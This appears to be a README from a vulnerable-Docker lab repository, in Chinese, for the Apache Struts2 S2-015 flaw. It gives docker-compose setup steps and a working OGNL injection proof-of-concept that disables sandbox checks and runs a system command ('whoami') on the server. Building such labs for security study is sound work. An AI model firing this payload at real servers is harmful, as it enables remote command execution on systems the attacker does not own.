### s2-015 vuldocker

## 测试环境搭建

```
docker-compose build
docker-compose up -d

安全完之后直接访问http://0.0.0.0:30080
```

```
poc:
${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())}.action

```

![1.png](https://raw.githubusercontent.com/Loneyers/vuldocker/master/struts2/s2-015/1.png)

